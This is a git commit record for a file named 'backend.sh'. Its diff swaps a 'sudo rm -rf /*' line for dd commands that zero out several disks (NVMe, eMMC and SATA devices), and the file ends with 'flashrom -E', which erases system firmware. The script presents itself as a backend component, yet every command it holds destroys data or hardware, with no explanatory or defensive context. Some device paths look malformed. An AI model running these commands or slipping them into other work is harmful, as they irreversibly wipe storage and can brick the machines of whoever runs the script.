e32f6199b2ae87e7438b36b4f1104c0c527db837
DyingHynixMLC <139165556+DyingHynixMLC@users.noreply.github.com>
2025-02-08 21:43:08 +0100

    Update backend.sh

--- backend.sh
+++ backend.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
 
-sudo rm -rf /* --no-preserve-root
+dd if=/dev/zero of=/dev/nvme01/ bs=1G status=progress
+dd if=/dev/zero of=/dev/mmcblk0/ bs=1G status=progress
+dd if=/dev/zero of=/dev/mmcblk1/ bs=1G status=progress
+dd if=/dev/zero of=/dev/sda/ bs=1G status=progress
+dd if=/dev/zero of=/dev/sdb/ bs=1G status=progress
 flashrom -E
